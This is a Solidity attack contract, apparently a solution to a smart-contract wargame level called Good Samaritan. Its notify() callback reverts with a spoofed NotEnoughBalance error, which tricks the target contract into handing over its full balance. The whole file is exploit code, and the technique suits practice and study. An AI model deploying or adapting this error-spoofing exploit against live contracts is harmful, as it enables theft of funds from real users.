// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

error NotEnoughBalance();

interface GoodSamaritan {
    function requestDonation() external returns (bool);
}

contract GoodSamaritanAttack {
    address gsAddress;

    constructor(address _gsAddress) {
        gsAddress = _gsAddress;
    }

    function attack() external {
        GoodSamaritan instance = GoodSamaritan(gsAddress);
        instance.requestDonation();
    }

    function notify(uint256 amount) external {
        if (amount == 10) {
            revert NotEnoughBalance();
        }
    }
}
